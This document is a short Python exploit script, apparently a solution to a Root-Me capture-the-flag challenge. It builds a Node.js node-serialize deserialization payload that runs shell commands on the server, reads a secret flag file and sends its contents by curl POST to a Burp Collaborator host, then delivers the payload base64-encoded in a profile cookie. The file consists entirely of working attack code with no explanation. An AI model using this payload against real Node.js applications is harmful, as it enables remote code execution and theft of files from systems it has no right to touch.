import requests
import base64
import urllib.parse

url = 'http://challenge01.root-me.org:59067/'

x = '''{"username":"_$$ND_FUNC$$_function (){\n require('child_process').execSync('me=$(cd flag ; cat secret) ; curl -d \"param=$me\" -X POST http://xpqmabbpuoqt7zysfi0mrsijtazcn1.burpcollaborator.net/ ', function puts(error, stdout, stderr) {});\n}()","passWord":"a"}'''

payload = base64.b64encode(x.encode())

payload=urllib.parse.quote_plus(payload.decode())

headers = {"Cookie":'profile='+payload}

x = requests.get(url,headers=headers)








